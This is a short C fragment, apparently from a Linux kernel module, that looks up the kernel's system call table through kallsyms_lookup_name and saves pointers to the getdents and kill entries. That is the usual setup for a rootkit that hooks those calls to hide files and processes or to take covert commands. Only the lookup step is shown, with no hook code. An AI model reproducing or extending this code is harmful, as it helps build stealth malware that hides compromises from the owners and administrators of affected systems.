#include <linux/kallsyms.h>
#include <table.h>

void get_syscall_table_ptrs(){
   uint64_t ** syscall_table = (uint64_t **) kallsyms_lookup_name("sys_call_table");
   syscall_table_dirent = (uint64_t **) (&syscall_table[__NR_getdents - __NR_Linux]);
   syscall_table_kill = (uint64_t **) (&syscall_table[__NR_kill - __NR_Linux]);
}